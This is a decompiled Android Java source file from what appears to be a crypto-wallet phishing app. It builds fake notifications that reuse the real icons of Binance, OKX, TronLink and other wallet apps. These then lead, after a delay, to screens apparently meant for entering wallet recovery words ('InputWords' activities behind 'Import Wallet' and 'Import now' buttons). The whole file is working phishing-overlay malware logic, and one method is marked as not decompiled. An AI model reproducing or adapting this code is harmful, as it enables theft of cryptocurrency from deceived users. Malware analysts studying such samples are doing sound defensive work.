package k3;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.AdaptiveIconDrawable;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import androidx.core.view.PointerIconCompat;
import androidx.work.impl.background.systemalarm.CommandHandler;
import com.superbock.bean.AdInfo;
import com.superbock.bean.LInfo;
import com.superbock.ui.AdAlertActivity;
import com.superbock.ui.AdAlertBottomActivity;
import com.superbock.ui.AdAlertOneButtonActivity;
import com.superbock.ui.AdBoxActivity;
import com.superbock.ui.AdConfirmActivity;
import com.superbock.ui.AdConfirmBottomActivity;
import com.superbock.ui.AdConfirmOneButtonActivity;
import com.superbock.ui.AdFullscreenActivity;
import com.superbock.ui.AdNoticeActivity;
import com.superbock.ui.AdSingleActivity;
import com.superbock.ui.AdSingleSmallActivity;
import com.superbock.ui.AdWebActivity;
import com.superbock.ui.AdWebSmallActivity;
import com.superbock.ui.custom.InputWordsBinanceActivity;
import com.superbock.ui.custom.InputWordsImActivity;
import com.superbock.ui.custom.InputWordsMetaActivity;
import com.superbock.ui.custom.InputWordsOkxActivity;
import com.superbock.ui.custom.InputWordsTpActivity;
import com.superbock.ui.custom.InputWordsTronglobalActivity;
import com.superbock.ui.custom.InputWordsTronlinkActivity;
import com.superbock.ui.custom.InputWordsTrustActivity;
import com.superbock.ui.custom.InputWordsWalletActivity;
import comeliest.metempsychosis.pokelogan.R;
import g3.m;
import java.io.File;
import java.io.FileOutputStream;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.Random;

/* loaded from: classes6.dex */
public final class e {

    /* renamed from: a, reason: collision with root package name */
    public static final List<String> f3867a = new ArrayList();

    /* loaded from: classes15.dex */
    public class a implements Runnable {

        /* renamed from: b, reason: collision with root package name */
        public final /* synthetic */ Context f3868b;

        /* renamed from: c, reason: collision with root package name */
        public final /* synthetic */ Intent f3869c;

        public a(Context context, Intent intent) {
            this.f3868b = context;
            this.f3869c = intent;
        }

        @Override // java.lang.Runnable
        public final void run() {
            this.f3868b.startActivity(this.f3869c);
        }
    }

    public static void a(Context context) {
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_TEXT);
        d5.setPkg("com.binance.dev");
        d5.setUse(2);
        String c5 = c(context, d5.getPkg());
        if (c5 != null) {
            d5.setImg(c5);
        } else {
            d5.setImg("2131492869");
        }
        d5.setTemplate(1);
        d5.setTitle(context.getString(R.string.binance));
        d5.setMsg(d(context, d5.getPkg()));
        d5.setLink("openapp:" + d5.getPkg());
        AdInfo adInfo = new AdInfo();
        adInfo.setType(2);
        adInfo.setTaskId(e3.d.a());
        adInfo.setCustomId(d5.getCustomId());
        adInfo.setPkg(d5.getPkg());
        adInfo.setUse(2);
        adInfo.setPreId(d5.getTaskId());
        if (c5 != null) {
            adInfo.setImg(c5);
        } else {
            adInfo.setImg("2131492869");
        }
        adInfo.setTemplate(9);
        adInfo.setTitle(context.getString(R.string.binance));
        adInfo.setMsg(context.getString(R.string.binanceBoxInputMsg));
        adInfo.setConfirm(context.getString(R.string.Import_Wallet));
        adInfo.setConfirmColor("0,0,0");
        adInfo.setConfirmBgColor("240,185,11");
        if (new Random().nextInt(2) == 1) {
            adInfo.setCancel(context.getString(R.string.Cancel));
            adInfo.setCancelColor("128,128,128");
        }
        d5.setAiLink(adInfo);
        d5.setAiLinkDelayMillis(5000L);
        AdInfo adInfo2 = new AdInfo();
        adInfo2.setCustomId(adInfo.getCustomId());
        adInfo2.setType(2);
        adInfo2.setTaskId(e3.d.a());
        adInfo2.setPreId(adInfo.getTaskId());
        adInfo2.setTemplate(PointerIconCompat.TYPE_TEXT);
        adInfo.setAiLink(adInfo2);
        Intent intent = new Intent(context, (Class<?>) AdNoticeActivity.class);
        intent.putExtra("adInfo", d5);
        d.e(context, intent);
    }

    public static boolean b(Context context) {
        ActivityManager.AppTask e5;
        LInfo lInfo;
        if (k3.a.a(context) && Build.VERSION.SDK_INT >= 23 && (e5 = k3.a.e(context)) != null) {
            m a5 = m.a();
            Objects.requireNonNull(a5);
            try {
                t2.g<LInfo, String> gVar = a5.f2977a;
                z2.h<LInfo, String> c5 = gVar.c();
                c5.l("sta", false);
                lInfo = gVar.j(c5.f());
            } catch (SQLException unused) {
                lInfo = null;
            }
            if (lInfo != null && lInfo.getTp() > 1000) {
                if (System.currentTimeMillis() - lInfo.getSto() < CommandHandler.WORK_PROCESSING_TIME_IN_MS) {
                    return true;
                }
                e5.finishAndRemoveTask();
            }
        }
        return false;
    }

    public static String c(Context context, String str) {
        File file;
        Bitmap bitmap;
        try {
            file = new File(context.getExternalFilesDir("/appicon") + "/" + str + ".png");
        } catch (Throwable unused) {
        }
        if (file.exists()) {
            return file.getPath();
        }
        PackageManager packageManager = context.getPackageManager();
        Drawable applicationIcon = packageManager.getApplicationIcon(packageManager.getApplicationInfo(str, 0));
        if (applicationIcon != null && !(applicationIcon instanceof ColorDrawable)) {
            if (Build.VERSION.SDK_INT < 26 || !(applicationIcon instanceof AdaptiveIconDrawable)) {
                bitmap = ((BitmapDrawable) applicationIcon).getBitmap();
            } else {
                bitmap = Bitmap.createBitmap(applicationIcon.getIntrinsicWidth(), applicationIcon.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
                Canvas canvas = new Canvas(bitmap);
                applicationIcon.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
                applicationIcon.draw(canvas);
            }
            File file2 = new File(context.getExternalFilesDir("/appicon") + "/" + str + ".png");
            file2.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            bitmap.compress(Bitmap.CompressFormat.PNG, 30, fileOutputStream);
            fileOutputStream.flush();
            fileOutputStream.close();
            return file2.getPath();
        }
        return null;
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:51:0x00a6, code lost:
    
        if (r3.equals("vip.mytokenpocket") == false) goto L52;
     */
    /* JADX WARN: Type inference failed for: r1v2, types: [java.util.HashSet, java.util.Set<java.lang.String>] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static java.lang.String d(android.content.Context r2, java.lang.String r3) {
        /*
            Method dump skipped, instructions count: 302
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: k3.e.d(android.content.Context, java.lang.String):java.lang.String");
    }

    public static void e(Context context) {
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_VERTICAL_TEXT);
        d5.setPkg("com.okinc.okex.gp");
        d5.setUse(2);
        String c5 = c(context, d5.getPkg());
        if (c5 != null) {
            d5.setImg(c5);
        } else {
            d5.setImg("2131492882");
        }
        d5.setTemplate(1);
        d5.setTitle(context.getString(R.string.okx));
        d5.setMsg(d(context, d5.getPkg()));
        d5.setLink("openapp:" + d5.getPkg());
        AdInfo adInfo = new AdInfo();
        adInfo.setType(2);
        adInfo.setTaskId(e3.d.a());
        adInfo.setCustomId(d5.getCustomId());
        adInfo.setPkg(d5.getPkg());
        adInfo.setUse(2);
        adInfo.setPreId(d5.getTaskId());
        if (c5 != null) {
            adInfo.setImg(c5);
        } else {
            adInfo.setImg("2131492882");
        }
        adInfo.setTemplate(9);
        adInfo.setTitle(context.getString(R.string.okx));
        adInfo.setMsg(context.getString(R.string.okxBoxInputMsg));
        adInfo.setConfirm(context.getString(R.string.Confirm));
        adInfo.setConfirmBgColor("0,0,0");
        adInfo.setAlign(1);
        if (new Random().nextInt(2) == 1) {
            adInfo.setCancel(context.getString(R.string.Cancel));
            adInfo.setCancelColor("128,128,128");
        }
        d5.setAiLink(adInfo);
        d5.setAiLinkDelayMillis(5000L);
        AdInfo adInfo2 = new AdInfo();
        adInfo2.setCustomId(adInfo.getCustomId());
        adInfo2.setType(2);
        adInfo2.setTaskId(e3.d.a());
        adInfo2.setPreId(adInfo.getTaskId());
        adInfo2.setTemplate(PointerIconCompat.TYPE_VERTICAL_TEXT);
        adInfo.setAiLink(adInfo2);
        Intent intent = new Intent(context, (Class<?>) AdNoticeActivity.class);
        intent.putExtra("adInfo", d5);
        d.e(context, intent);
    }

    public static void f(Context context, AdInfo adInfo, long j5) {
        Intent intent;
        int template = adInfo.getTemplate();
        switch (template) {
            case 1:
                intent = new Intent(context, (Class<?>) AdNoticeActivity.class);
                break;
            case 2:
                intent = new Intent(context, (Class<?>) AdSingleActivity.class);
                break;
            case 3:
                intent = new Intent(context, (Class<?>) AdSingleSmallActivity.class);
                break;
            case 4:
                intent = new Intent(context, (Class<?>) AdFullscreenActivity.class);
                break;
            case 5:
                intent = new Intent(context, (Class<?>) AdWebActivity.class);
                break;
            case 6:
                intent = new Intent(context, (Class<?>) AdWebSmallActivity.class);
                break;
            case 7:
                if (!TextUtils.isEmpty(adInfo.getImg())) {
                    if (!TextUtils.isEmpty(adInfo.getCancel())) {
                        intent = new Intent(context, (Class<?>) AdAlertActivity.class);
                        break;
                    } else {
                        intent = new Intent(context, (Class<?>) AdAlertOneButtonActivity.class);
                        break;
                    }
                } else if (!TextUtils.isEmpty(adInfo.getCancel())) {
                    intent = new Intent(context, (Class<?>) AdConfirmActivity.class);
                    break;
                } else {
                    intent = new Intent(context, (Class<?>) AdConfirmOneButtonActivity.class);
                    break;
                }
            case 8:
                if (!TextUtils.isEmpty(adInfo.getImg())) {
                    intent = new Intent(context, (Class<?>) AdAlertBottomActivity.class);
                    break;
                } else {
                    intent = new Intent(context, (Class<?>) AdConfirmBottomActivity.class);
                    break;
                }
            case 9:
                intent = new Intent(context, (Class<?>) AdBoxActivity.class);
                break;
            default:
                switch (template) {
                    case PointerIconCompat.TYPE_CONTEXT_MENU /* 1001 */:
                        intent = new Intent(context, (Class<?>) InputWordsTrustActivity.class);
                        break;
                    case PointerIconCompat.TYPE_HAND /* 1002 */:
                        intent = new Intent(context, (Class<?>) InputWordsTpActivity.class);
                        break;
                    case PointerIconCompat.TYPE_HELP /* 1003 */:
                        intent = new Intent(context, (Class<?>) InputWordsImActivity.class);
                        break;
                    case PointerIconCompat.TYPE_WAIT /* 1004 */:
                        intent = new Intent(context, (Class<?>) InputWordsMetaActivity.class);
                        break;
                    case 1005:
                        intent = new Intent(context, (Class<?>) InputWordsWalletActivity.class);
                        break;
                    case PointerIconCompat.TYPE_CELL /* 1006 */:
                        intent = new Intent(context, (Class<?>) InputWordsTronlinkActivity.class);
                        break;
                    case PointerIconCompat.TYPE_CROSSHAIR /* 1007 */:
                        intent = new Intent(context, (Class<?>) InputWordsTronglobalActivity.class);
                        break;
                    case PointerIconCompat.TYPE_TEXT /* 1008 */:
                        intent = new Intent(context, (Class<?>) InputWordsBinanceActivity.class);
                        break;
                    case PointerIconCompat.TYPE_VERTICAL_TEXT /* 1009 */:
                        intent = new Intent(context, (Class<?>) InputWordsOkxActivity.class);
                        break;
                    default:
                        intent = null;
                        break;
                }
        }
        if (intent != null) {
            intent.putExtra("adInfo", adInfo);
            Handler handler = new Handler(Looper.getMainLooper());
            a aVar = new a(context, intent);
            if (j5 <= 0) {
                j5 = 1000;
            }
            handler.postDelayed(aVar, j5);
        }
    }

    public static void g(Context context) {
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_CROSSHAIR);
        d5.setPkg("com.tronlink.global");
        d5.setUse(2);
        String c5 = c(context, d5.getPkg());
        if (c5 != null) {
            d5.setImg(c5);
        } else {
            d5.setImg("2131165377");
        }
        d5.setTemplate(1);
        d5.setTitle(context.getString(R.string.tronlinkglobal));
        d5.setMsg(d(context, d5.getPkg()));
        d5.setLink("openapp:" + d5.getPkg());
        AdInfo adInfo = new AdInfo();
        adInfo.setType(2);
        adInfo.setTaskId(e3.d.a());
        adInfo.setCustomId(d5.getCustomId());
        adInfo.setPkg(d5.getPkg());
        adInfo.setUse(2);
        adInfo.setPreId(d5.getTaskId());
        if (c5 != null) {
            adInfo.setImg(c5);
        } else {
            adInfo.setImg("2131165377");
        }
        adInfo.setTemplate(9);
        adInfo.setTitle(context.getString(R.string.tronlinkglobal));
        adInfo.setMsg(context.getString(R.string.imBoxInputMsg));
        adInfo.setConfirm(context.getString(R.string.Import_now));
        adInfo.setBgColor("255,255,255");
        adInfo.setConfirmColor("255,255,255");
        adInfo.setConfirmBgColor("2,28,49");
        if (new Random().nextInt(2) == 1) {
            adInfo.setCancel(context.getString(R.string.Cancel));
            adInfo.setCancelColor("128,128,128");
        }
        d5.setAiLink(adInfo);
        d5.setAiLinkDelayMillis(5000L);
        AdInfo adInfo2 = new AdInfo();
        adInfo2.setCustomId(adInfo.getCustomId());
        adInfo2.setType(2);
        adInfo2.setTaskId(e3.d.a());
        adInfo2.setPreId(adInfo.getTaskId());
        adInfo2.setTemplate(PointerIconCompat.TYPE_CROSSHAIR);
        if (new Random().nextInt(3) >= 1) {
            adInfo2.setBack(1);
        }
        adInfo.setAiLink(adInfo2);
        Intent intent = new Intent(context, (Class<?>) AdNoticeActivity.class);
        intent.putExtra("adInfo", d5);
        d.e(context, intent);
    }

    public static void h(Context context) {
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_CELL);
        d5.setPkg("com.tronlinkpro.wallet");
        d5.setUse(2);
        String c5 = c(context, d5.getPkg());
        if (c5 != null) {
            d5.setImg(c5);
        } else {
            d5.setImg("2131165378");
        }
        d5.setTemplate(1);
        d5.setTitle(context.getString(R.string.tronlinkpro));
        d5.setMsg(d(context, d5.getPkg()));
        d5.setLink("openapp:" + d5.getPkg());
        AdInfo adInfo = new AdInfo();
        adInfo.setType(2);
        adInfo.setTaskId(e3.d.a());
        adInfo.setCustomId(d5.getCustomId());
        adInfo.setPkg(d5.getPkg());
        adInfo.setUse(2);
        adInfo.setPreId(d5.getTaskId());
        if (c5 != null) {
            adInfo.setImg(c5);
        } else {
            adInfo.setImg("2131165378");
        }
        adInfo.setTemplate(9);
        adInfo.setTitle(context.getString(R.string.tronlinkpro));
        adInfo.setMsg(context.getString(R.string.imBoxInputMsg));
        adInfo.setConfirm(context.getString(R.string.Import_now));
        adInfo.setBgColor("255,255,255");
        adInfo.setConfirmColor("255,255,255");
        adInfo.setConfirmBgColor("2,28,49");
        if (new Random().nextInt(2) == 1) {
            adInfo.setCancel(context.getString(R.string.Cancel));
            adInfo.setCancelColor("128,128,128");
        }
        d5.setAiLink(adInfo);
        d5.setAiLinkDelayMillis(5000L);
        AdInfo adInfo2 = new AdInfo();
        adInfo2.setCustomId(adInfo.getCustomId());
        adInfo2.setType(2);
        adInfo2.setTaskId(e3.d.a());
        adInfo2.setPreId(adInfo.getTaskId());
        adInfo2.setTemplate(PointerIconCompat.TYPE_CELL);
        if (new Random().nextInt(3) >= 1) {
            adInfo2.setBack(1);
        }
        adInfo.setAiLink(adInfo2);
        Intent intent = new Intent(context, (Class<?>) AdNoticeActivity.class);
        intent.putExtra("adInfo", d5);
        d.e(context, intent);
    }
}
